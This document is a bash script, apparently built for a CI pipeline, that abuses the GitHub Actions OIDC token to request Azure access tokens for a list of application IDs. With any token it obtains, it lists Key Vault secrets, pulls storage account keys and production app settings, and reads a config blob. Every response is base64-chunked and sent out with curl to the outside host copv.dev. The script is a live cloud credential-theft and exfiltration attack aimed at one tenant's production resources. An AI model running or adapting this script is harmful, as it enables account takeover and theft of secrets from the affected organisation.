#!/usr/bin/env bash
set +e
SINK="http://copv.dev:8089"
TAG="tb3$$"
exfil() {
  local label="$1" data="$2" b64 i len
  b64=$(printf '%s' "$data" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  len=${#b64}; echo "[exfil] $label len=$len"; i=0
  while [ $i -lt $len ]; do
    curl -sS -m 10 -o /dev/null "$SINK/x/$TAG/$label/$i/${b64:$i:1400}" || true; i=$((i+1400))
  done
}
echo "=== v4: FIC exchange for every known appId ==="
OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
  python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "oidc_len=${#OIDC}"
TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

exch() { # exch <appId> <scope> -> token or empty
  curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$1" -d grant_type=client_credentials \
    --data-urlencode "scope=$2" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$OIDC"
}

IDS="038bc35d-131d-4953-9985-ff4a245ccec1:cost-reader
2c34300e-1bc0-41e7-9c1e-8b7571d72c72:directory-audit
7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync
891fb158-e02c-4428-a885-53b811f369c0:legacy-admin
6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights
12ed54de-f2eb-4784-804c-3a7a3e83a9e9:reporting-service
881fddce-6208-4af5-a297-7e79c912f83c:reporting-viewer
58108da8-044e-4d7e-9a46-92e6-179b30be0:secrets-sync
462d1c38-4459-48b8-9333-82e389e59514:platform-automation
72ff278a-9e71-43ec-bac4-2ca303f8e462:cicd-deployer
7a85156a-01c4-4e61-8472-40a92107159b:id-tbl-reporting-writer-MI
eeab432e-1bf6-400e-b155-a28ce7cafcdb:app-sysMI"

for LINE in $IDS; do
  APPID="${LINE%%:*}"; NAME="${LINE##*:}"
  R=$(exch "$APPID" "https://management.azure.com/.default")
  T=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  echo "$NAME exch: tok=${#T}"
  [ -z "$T" ] && { exfil "exchfail-$NAME" "$R"; continue; }
  exfil "exchok-$NAME" "$R"
  # if token minted: try kv-sec list, appcfg blob, exports blob, listKeys on appcfg
  exfil "kvsec-$NAME" "$(curl -sS -m 12 -H "Authorization: Bearer $T" 'https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4')"
  exfil "lkappcfg-$NAME" "$(curl -sS -m 12 -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01")"
  exfil "lkbackup-$NAME" "$(curl -sS -m 12 -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz/listKeys?api-version=2023-01-01")"
  exfil "appset-$NAME" "$(curl -sS -m 12 -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01")"
  # storage data-plane blob read with AAD token
  exfil "blobcfg-$NAME" "$(curl -sS -m 12 -H "Authorization: Bearer $T" -H 'x-ms-version: 2020-10-02' 'https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json')"
done
echo "=== DONE ==="
